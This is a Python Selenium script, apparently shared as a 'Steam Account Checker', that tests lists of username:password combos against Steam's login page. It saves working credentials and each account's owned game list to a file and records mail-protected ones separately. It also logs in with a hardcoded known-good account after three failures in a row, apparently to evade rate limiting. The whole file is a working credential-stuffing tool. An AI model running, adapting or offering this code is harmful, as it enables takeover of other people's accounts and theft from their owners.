from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import re,time
import colorama 
from colorama import Fore, Back, Style

colorama.init()

print(Fore.RED)
print( """\

╔═╗╔╦╗╔═╗╔═╗╔╦╗  ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
╚═╗ ║ ║╣ ╠═╣║║║  ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
╚═╝ ╩ ╚═╝╩ ╩╩ ╩  ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
Discord: discord.gg/HMMGKdC
Github: github.com/Galerici
                                                                                                                         
                                                       
 """ )

kaçtanedebirdoğrugirelim = 3
doğruhesap = "kutxyromero:123456"

ardardaunposible = 0



hesaplar = re.findall("\w{5,30}[@]?\w{1,10}[.]?\w{1,30}[:]\S+",open("accounts.txt","r", encoding="utf8").read())
hesaplarlength = len(hesaplar)

def doğruhesapyap(hesap):
    global ardardaunposible
    options = webdriver.ChromeOptions()
    options.add_argument("--incognito")
    # options.add_argument("--headless")
    options.add_argument("log-level=2")
    chrome = webdriver.Chrome(options=options)
    chrome.get("https://store.steampowered.com/login/")
    hesap = hesap.split(":")
    chrome.find_element_by_id("input_username").send_keys(hesap[0])
    chrome.find_element_by_id("input_password").send_keys(hesap[1])
    chrome.find_element_by_id("input_password").send_keys(Keys.ENTER)
    def bekle():
        global hataoldumu,ardardaunposible
        try:
            if (chrome.find_element_by_id("login_btn_wait").is_displayed()):
                time.sleep(0.3)
                bekle()
                return 0
        except:
            time.sleep(2)
            ardardaunposible = 0
            chrome.quit()
    bekle()

def hesapyap(hesap, kaçıncı = 0):
    options = webdriver.ChromeOptions()
    options.add_argument("--incognito")
    #options.add_argument("--headless")
    options.add_argument("log-level=2")
    chrome = webdriver.Chrome(options=options)
    chrome.get("https://store.steampowered.com/login/")
    hesap = hesap.split(":")
    chrome.find_element_by_id("input_username").send_keys(hesap[0])
    chrome.find_element_by_id("input_password").send_keys(hesap[1])
    chrome.find_element_by_id("input_password").send_keys(Keys.ENTER)
    hataoldumu = False
    def bekle():
        global hataoldumu,ardardaunposible
        try:
            if (chrome.find_element_by_id("login_btn_wait").is_displayed()):
                time.sleep(0.3)
                bekle()
                return 0
            else:
                time.sleep(2)
                if len(chrome.find_element_by_id("error_display").text) > 2:
                    print("Account Bad  (" + str(kaçıncı) + "/" + str(hesaplarlength) + ")")
                    ardardaunposible += 1
                    chrome.quit()
                else:
                    time.sleep(0.5)
                    if len(chrome.find_elements_by_class_name("newmodal")) > 0:
                        print("Mail Protect  (" + str(kaçıncı) + "/" + str(hesaplarlength) + ")")
                        open("mailprotectedaccounts.txt", "a").writelines(hesap[0] + ":" + hesap[1] + "\n")
                        ardardaunposible += 1
                        chrome.quit()
        except:
            print("Account Good (" + str(kaçıncı) + "/" + str(hesaplarlength) + ")")
            ardardaunposible = 0
            print("Oyun Bilgileri Alınıyor")
            open("Good Accounts.txt", "a").writelines(hesap[0] + ":" + hesap[1] + "\n")
            time.sleep(2)
            chrome.get(chrome.find_element_by_xpath(
                "/html/body/div[1]/div[7]/div[1]/div/div[3]/div/div[3]/div/a[1]").get_attribute("href"))
            chrome.get(chrome.current_url + "/games/?tab=all")
            open("Good Accounts.txt", "a").writelines("{" + "\n")
            for gametext in chrome.find_elements_by_class_name("gameListRowItemName"):
                print(gametext.text)
                open("Good Accounts.txt", "a").writelines(gametext.text + "\n")
            open("Good Accounts.txt", "a").writelines("}" + "\n")
            open("Good Accounts.txt", "a").writelines("-----------------------" + "\n")
            chrome.quit()
    bekle()


kaçıncı = 0
for hesap in hesaplar:
    kaçıncı += 1
    if ardardaunposible == kaçtanedebirdoğrugirelim:
        print("Performing Verification...")
        doğruhesapyap(doğruhesap)
        print("Verification Ok")
        hesapyap(hesap,kaçıncı)
        kaçlıkombo = 0
    else:
        hesapyap(hesap,kaçıncı)

